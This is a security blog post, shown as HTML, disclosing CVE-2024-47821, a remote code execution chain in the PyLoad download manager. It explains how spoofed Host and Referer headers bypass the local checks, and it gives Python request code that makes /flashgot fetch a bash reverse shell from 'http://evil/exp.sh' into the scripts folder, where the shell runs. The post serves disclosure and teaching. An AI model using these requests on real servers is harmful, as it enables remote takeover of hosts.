<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="">
<meta name="description"
    content="I found my first CVE! CVE-2024-47821 (GitHub Advisory) is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder ~/.pyload/scripts on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in ~/.pyload/scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in ~/.pyload/scripts path and using the /flashgot API to download the file.
" />
<meta name="keywords"
    content="homepage, blog, python, cve-analysis" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/posts/cve-2024-47821/" />


<title>
    
    CVE-2024-47821: Remote Code Execution in PyLoad :: Bayesian Blogs 
    
</title>





  <link rel="stylesheet" href="/main.min.fdc47f2ea14102755136c9244f7fedfda5afa7ad0acc3947a50e795b188c7e74.css" integrity="sha256-/cR/LqFBAnVRNskkT3/t/aWvp60KzDlHpQ55WxiMfnQ=" crossorigin="anonymous">





    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="CVE-2024-47821: Remote Code Execution in PyLoad">
  <meta itemprop="description" content="I found my first CVE! CVE-2024-47821 (GitHub Advisory) is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder ~/.pyload/scripts on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in ~/.pyload/scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in ~/.pyload/scripts path and using the /flashgot API to download the file.">
  <meta itemprop="datePublished" content="2024-10-25T17:00:09-08:00">
  <meta itemprop="dateModified" content="2024-10-25T17:00:09-08:00">
  <meta itemprop="wordCount" content="1576">
  <meta itemprop="image" content="http://localhost:1313/">
  <meta itemprop="keywords" content="Python,Cve-Analysis">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/">
  <meta name="twitter:title" content="CVE-2024-47821: Remote Code Execution in PyLoad">
  <meta name="twitter:description" content="I found my first CVE! CVE-2024-47821 (GitHub Advisory) is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder ~/.pyload/scripts on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in ~/.pyload/scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in ~/.pyload/scripts path and using the /flashgot API to download the file.">



<meta property="og:url" content="http://localhost:1313/posts/cve-2024-47821/">
  <meta property="og:site_name" content="Bayesian Blogs">
  <meta property="og:title" content="CVE-2024-47821: Remote Code Execution in PyLoad">
  <meta property="og:description" content="I found my first CVE! CVE-2024-47821 (GitHub Advisory) is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder ~/.pyload/scripts on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in ~/.pyload/scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in ~/.pyload/scripts path and using the /flashgot API to download the file.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-10-25T17:00:09-08:00">
    <meta property="article:modified_time" content="2024-10-25T17:00:09-08:00">
    <meta property="article:tag" content="Python">
    <meta property="article:tag" content="Cve-Analysis">
    <meta property="og:image" content="http://localhost:1313/">






<meta property="article:published_time" content="2024-10-25 17:00:09 -0800 -0800" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                cd /home</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Blog</a></li><li><a href="/cocktails">Cocktails</a></li><li><a href="/pgp">PGP</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
<main class="post">

  <div class="post-info">
    <p>
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
        class="feather feather-clock">
        <circle cx="12" cy="12" r="10"></circle>
        <polyline points="12 6 12 12 16 14"></polyline>
      </svg>
      8 minutes

      
    </p>
  </div>

  <article>
    <h1 class="post-title">
      <a href="http://localhost:1313/posts/cve-2024-47821/">CVE-2024-47821: Remote Code Execution in PyLoad</a>
    </h1>

    

    
    <hr />
    <aside id="toc">
      <div class="toc-title">Table of Contents</div>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#a-history-lesson">A history lesson</a></li>
    <li><a href="#cve-2024-28397">CVE-2024-28397</a></li>
    <li><a href="#bypassing-local_check">Bypassing <code>local_check</code></a></li>
    <li><a href="#blind-server-side-request-forgery">Blind Server Side Request Forgery</a></li>
    <li><a href="#escalating-the-ssrf-to-remote-code-execution">Escalating the SSRF to Remote Code Execution</a></li>
    <li><a href="#a-small-word-regarding-my-setup">A small word regarding my setup</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#timeline">Timeline</a></li>
  </ul>
</nav>
    </aside>
    <hr />

    

    <div class="post-content">
        <p>I found my first CVE! <a href="https://www.cve.org/CVERecord?id=CVE-2024-47821">CVE-2024-47821</a> (<a href="https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g">GitHub Advisory</a>) is a remote code execution vulnerability in <a href="https://pyload.net/">PyLoad</a>. PyLoad is an open source download manager written in Python. The folder <code>~/.pyload/scripts</code> on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in <code>~/.pyload/scripts</code> and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in <code>~/.pyload/scripts</code> path and using the <code>/flashgot</code> API to download the file.</p>
<p>CVSS v4.0 Base Score: 9.4 (<a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H">AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</a>)</p>
<p>I rated PR:H as admin access is required to change the dowload folder to <code>~/.pyload/scripts</code>. Once that is done, no privileges are required to send the requests to trigger RCE.</p>
<h2 id="a-history-lesson">A history lesson</h2>
<p>I first encountered PyLoad in the Hack the Box PC machine (I <a href="https://www.baishya.xyz/posts/htb-pc/">wrote</a> about writing a script to solve the machine in an automatable fashion). I then analyzed some CVEs in PyLoad in a previous <a href="https://baishya.xyz/posts/pyload-cves/">post</a>. While analyzing the CVEs, I built a decent understanding of how the APIs and Web UI of PyLoad work.</p>
<p>Since I had already spent some time looking at PyLoad code, I decided to choose PyLoad as my target to find a CVE - and then proceeded to not do anything with respect to security research for the next few months (partially due to some life events - but mostly because I was lazy). Eventually, I somehow dragged myself back to the realm of security research - and I decided to take another look at PyLoad.</p>
<p>PyLoad uses a library <code>js2py</code> to execute JavaScript in Python. This was the source of a previous remote code execution CVE (CVE-2023–0297). The TL;DR is that PyLoad did not disable <code>js2py</code>&rsquo;s <code>pyimport</code> feature and therefore allowed importing of Python libraries like <code>os</code> into <code>js2py.eval_js()</code>. This allowed an attacker to send a crafted request with a command injection payload in the <code>jk</code> parameter to the <code>/flash/addcrypted2</code> API and achieve remote code execution. To fix this issue, <code>pyimport</code> was disabled for PyLoad.</p>
<h2 id="cve-2024-28397">CVE-2024-28397</h2>
<p>I had previously learnt about recursive attribute lookups in Python - and I wondered if this could be used to find a module through recursive lookup in <code>js2py</code>, which allowed executing code. Turns out the answer is Yes. However:</p>
<ol>
<li>This was already discovered (<a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">CVE-2024-28397</a>)</li>
<li>The payload was way beyond something I could have come up with.</li>
</ol>
<p>This was good news to me - since I could try the payload provided in the repo against PyLoad and see if it worked. I quickly got a script ready to call the <code>/flash/addcrypted2</code> with the payload provided in <code>jk</code> parameter to test if PyLoad is vulnerable to this CVE. On sending the request, I encountered a strange error: <code>403: Forbidden</code>. Huh? I did not see any authentication checks in the API code, so I was confused why I got this error.</p>
<h2 id="bypassing-local_check">Bypassing <code>local_check</code></h2>
<p>To understand the source of this error, I took another look at the API code. The function for this API has a <code>local_check</code> decorator:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flash/addcrypted2&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;addcrypted2&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addcrypted2</span>():
</span></span><span style="display:flex;"><span>    package <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;package&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;source&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;referer&#34;</span>))
</span></span><span style="display:flex;"><span>    )
</span></span></code></pre></div><p>The decorator is defined like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local_check</span>(func):
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(func)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wrapper</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>        remote_addr <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>        http_host <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;HTTP_HOST&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> remote_addr <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::ffff:127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span>, <span style="color:#e6db74">&#34;localhost&#34;</span>) <span style="color:#f92672">or</span> http_host <span style="color:#f92672">in</span> (
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;[::1]:9666&#34;</span>,
</span></span><span style="display:flex;"><span>        ):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> func(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Forbidden&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> wrapper
</span></span></code></pre></div><p>The <code>local_check</code> function relies on the HTTP Host header to determine if the request came from a local address. The HTTP Host header can be manipulated by the sender of the request - and therefore can be spoofed to bypass this check (I will dive into more details in a later section). Combining the <code>local_check</code> bypass and the payload for CVE-2024-28397, I was able to achieve remote code execution in PyLoad.</p>
<p>I reported this issue to the PyLoad developers, but it turned out that the researcher who discovered CVE-2024-28397 had already reported it to PyLoad - which in hindsight was pretty obvious, since their repo mentions PyLoad is vulnerable to this CVE. At the time of me (re)discovering that PyLoad is vulnerable to CVE-2024-28397, there was no advisory for this issue for PyLoad - so I had decided to report it anyway. A few days later, an advisory was released - crediting the original reporter of CVE-2024-28397.</p>
<p>Since my submission was deemed a duplicate, I set out to find a new CVE in PyLoad - something that did not rely on existing CVEs in libraries used by PyLoad. I went back to the APIs listed in <a href="https://github.com/pyload/pyload/blob/develop/src/pyload/webui/app/blueprints/cnl_blueprint.py"><code>cnl_blueprint.py</code></a> (the same file where the <code>/flash/addcrypted2</code> API and the <code>local_check</code> function are defined). Since I knew I could bypass the <code>local_check</code>, I wanted to find another API that performs some &ldquo;dangerous&rdquo; operation.</p>
<h2 id="blind-server-side-request-forgery">Blind Server Side Request Forgery</h2>
<p>The <code>cnl_blueprint.py</code> file has another API <code>/flashgot</code> which in addition to the <code>local_check</code> has a Referer header check. This header check can also be bypassed by just setting it to something PyLoad will accept.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot_pyload&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flashgot</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>referrer <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://localhost:9666/flashgot&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>,
</span></span><span style="display:flex;"><span>    ):
</span></span><span style="display:flex;"><span>        flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">500</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>    
</span></span></code></pre></div><p>Combining the headers to bypass both checks, I arrived at headers like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
</span></span></code></pre></div><p>The <code>flashgot</code> API has a functionality to provide an URL from which PyLoad will download a file. There is additional parameter <code>autostart</code> which when provided results in PyLoad automatically downloading the file without any user interaction. Sending a request like below will download the file at the URL, to a folder named as per the <code>package</code> parameter, in the download location set in PyLoad (by default its <code>~/Downloads</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://pyload/flashgot&#34;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;example_packge&#34;</span>,  
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
</span></span></code></pre></div><p>I created a file <code>exp.sh</code> which contained a basic bash reverse shell and exposed it using a Python simple HTTP server. Once I sent the request, PyLoad downloaded the <code>exp.sh</code> to <code>~/Downloads/example_package/exp.sh</code>. This is a blind SSRF vulnerability, but it is not particularly interesting. An attacker can probably use this to download malware into a system running PyLoad - but its not as interesting as code execution.</p>
<h2 id="escalating-the-ssrf-to-remote-code-execution">Escalating the SSRF to Remote Code Execution</h2>
<p>The next step in my journey to find remote code execution was to somehow execute the reverse shell script. There are a few other CVEs in PyLoad where a file was downloaded to certain folders to have them execute or render - leading to remote code execution. However, as a fix for these issues, certain paths could not be set as the download folder.</p>
<p>Purely by chance, while I was staring at PyLoad logs, I found a log line that said &ldquo;No script found under folder download_finished&rdquo;. This implied that a user can specify scripts that are run when downloads are finished. Looking for this folder on my system, I came across a folder <code>~/.pyload/scripts</code> which has many subfolders for different triggers such as <code>download_finished</code>, <code>package_processed</code> and so on.</p>
<p>I added a script to the <code>download_finished</code> folder and then sent a download request to <code>/flashgot</code>. Once the file was downloaded, the script I added to <code>download_finished</code> executed! From there, the path to remote code execution was pretty straighforward. I had to change a few PyLoad settings:</p>
<ol>
<li>Change the download folder to <code>~/.pyload/scripts</code></li>
<li>Change permissions of downloads: on</li>
<li>Permission mode for downloaded files: 0744</li>
</ol>
<p><img src="/cve-2024-47821-1.png" alt="download-location"></p>
<p>I also changed my request to <code>/flashgot</code> to set the <code>package</code> to <code>download_finised</code> so that the script is downloaded to the <code>download_finished</code> folder.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;download_finished&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Sending this request once downloads <code>exp.sh</code> (which is a bash reverse shell) to the <code>download_finished</code> folder.</p>
<p><img src="/cve-2024-47821-2.png" alt="download-finished"></p>
<p>Sending it a second time downloads <code>exp.sh</code> again into the folder, but crucially also executes the existing <code>exp.sh</code> script.</p>
<p><img src="/cve-2024-47821-3.png" alt="script-exec"></p>
<p>I set up a simple <code>nc</code> listener where I received a reverse shell once <code>exp.sh</code> was executed. Remote code execution acheived, system compromised.</p>
<p><img src="/cve-2024-47821-4.png" alt="rce"></p>
<h2 id="a-small-word-regarding-my-setup">A small word regarding my setup</h2>
<p>A while back I had purchased a Raspberry Pi - and as with quite a few things I buy - I played with it for a week or two and then it just sat at my desk (in that one week I installed pihole on it - so it is not completely useless). So on a whim, I decided to install PyLoad on the Pi instead of my laptop. This turned out to be an important decision - as this led me to discovering the <code>local_check</code> function. If I was testing PyLoad on my laptop itself, the <code>local_check</code> would not have triggered. I might have found the other issues anyway, but bypassing the <code>local_check</code> check makes the finding &ldquo;complete&rdquo;.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That was a fun ride! My first CVE will always be special, but it being a remote code execution issue makes it even better. Having to chain multiple bugs was a great exercise for my research skills. Finding this CVE gives me the confidence and motivation to continue hunting. My aim for this year was to find one CVE. Having found that, and with a couple months remaining in the year - maybe I will find more?</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>September 8, 2024: Issue reported to PyLoad via GitHub.</li>
<li>October 4, 2024: Report accepted by PyLoad maintainers.</li>
<li>October 7, 2024: CVE 2024-47821 assigned.</li>
<li>October 25, 2024: Patched version of PyLoad released, blog published.</li>
</ul>
<p>Thank you for reading! Take care!</p>

    </div>

    
  </div>

  
    <div class="pagination">
        

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="http://localhost:1313/posts/reversing-airflow-patches/">
                    <span class="button__icon">←</span>
                    <span class="button__text">Not a CVE: Using Airflow via Docker Can Lead to Arbitrary Code Execution</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="http://localhost:1313/posts/pyload-cves/">
                    <span class="button__text">Analyzing new-ish CVEs in PyLoad</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


  

  

</main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2025</span>
            
            
            
            <span>Anuraag Baishya</span>
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a> & <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello Friend NG</a> theme</span>
        </div>
    </div>
    
</footer>

            
        </div>

        


<script type="text/javascript" src="/bundle.min.4037dc94fd1565c4fd3354e2b4a2d1ff11842c906242435350b4d2d8d6e8b7890da46c0a865173f543a6161c1f4d1c94147f1b907db36489fc2bf5e20d4af75c.js" integrity="sha512-QDfclP0VZcT9M1TitKLR/xGELJBiQkNTULTS2Nbot4kNpGwKhlFz9UOmFhwfTRyUFH8bkH2zZIn8K/XiDUr3XA=="></script>




    </body>
</html>
